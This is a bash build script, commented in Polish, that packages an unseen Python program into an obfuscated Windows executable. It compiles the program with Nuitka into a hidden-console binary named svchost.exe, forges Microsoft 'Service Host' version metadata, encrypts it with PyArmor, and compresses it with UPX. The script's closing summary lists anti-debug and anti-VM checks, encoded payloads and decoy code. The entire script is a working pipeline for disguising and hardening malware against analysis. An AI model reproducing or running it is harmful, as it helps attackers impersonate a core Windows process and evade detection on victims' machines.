#!/bin/bash
# ============================================
#  FULL BUILD: v2.py → obfuscated Windows EXE
#  Wymaga: sudo (jednorazowo do instalacji)
#  Platforma: Fedora Linux ARM (Asahi)
# ============================================
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

echo "============================================"
echo " SETUP & BUILD: Obfuscated Windows EXE"
echo "============================================"
echo ""

# ---- STEP 0: Install system deps ----
echo "[0/6] Instalacja zaleznosci systemowych (wymaga sudo)..."
sudo dnf install -y mingw64-gcc mingw64-gcc-c++ upx wine 2>/dev/null || {
    echo "[!] Instalacja wine mogla nie zadzialalic (brak pakietu ARM)"
    sudo dnf install -y mingw64-gcc mingw64-gcc-c++ upx 2>/dev/null || true
}

# ---- STEP 1: Install Python deps ----
echo "[1/6] Instalacja Python deps..."
pip install pyarmor pyinstaller nuitka pydivert 2>/dev/null

# ---- STEP 2: Generate obfuscated Python ----
echo "[2/6] Generowanie zobfuskowanego kodu..."
python3 generate_obfuscated.py

# ---- STEP 3: PyArmor ----
echo "[3/6] PyArmor obfuskacja..."
# PyArmor for Windows target
pyarmor gen --platform windows.x86_64 --output armored_win v2_final.py 2>/dev/null || {
    echo "[!] PyArmor cross-platform nie zadziatal, kopiuje surowy plik..."
    mkdir -p armored_win
    cp v2_final.py armored_win/v2_final.py
}

# ---- STEP 4: Nuitka cross-compile ----
echo "[4/6] Nuitka cross-kompilacja do Windows EXE..."
cd armored_win

# Nuitka z mingw64 cross-compilerem
python3 -m nuitka \
    --onefile \
    --mingw64 \
    --windows-disable-console \
    --windows-company-name="Microsoft Corporation" \
    --windows-product-name="Service Host" \
    --windows-file-version=10.0.19041.1 \
    --windows-product-version=10.0.19041.1 \
    --windows-file-description="Host Process for Windows Services" \
    --output-filename=svchost.exe \
    --remove-output \
    --python-flag=no_docstrings,no_asserts \
    --follow-imports \
    --assume-yes-for-downloads \
    v2_final.py 2>&1

cd "$SCRIPT_DIR"

# ---- STEP 5: UPX ----
echo "[5/6] UPX kompresja..."
EXEPATH=$(find armored_win -name "svchost.exe" -type f 2>/dev/null | head -1)
if [ -n "$EXEPATH" ]; then
    upx --best --lzma "$EXEPATH" 2>/dev/null || true
    cp "$EXEPATH" "$SCRIPT_DIR/svchost.exe"
fi

# ---- STEP 6: Verify ----
echo "[6/6] Weryfikacja..."
if [ -f "$SCRIPT_DIR/svchost.exe" ]; then
    echo ""
    echo "============================================"
    echo " BUILD COMPLETE!"
    echo "============================================"
    file "$SCRIPT_DIR/svchost.exe"
    ls -lh "$SCRIPT_DIR/svchost.exe"
    echo ""
    echo "Warstwy ochrony:"
    echo "  1. Obfuskacja zmiennych i stringow (chr() encoding)"
    echo "  2. Marshal + zlib + base85 payload encoding"
    echo "  3. Anti-debug / Anti-VM runtime checks"
    echo "  4. Decoy code (fake classes/functions)"
    echo "  5. PyArmor bytecode encryption"
    echo "  6. Nuitka C compilation (nie Python bytecode!)"
    echo "  7. UPX compression + LZMA"
    echo ""
    echo "Plik: $SCRIPT_DIR/svchost.exe"
else
    echo "[BLAD] Build nie powiodl sie. Sprawdz logi powyzej."
    exit 1
fi
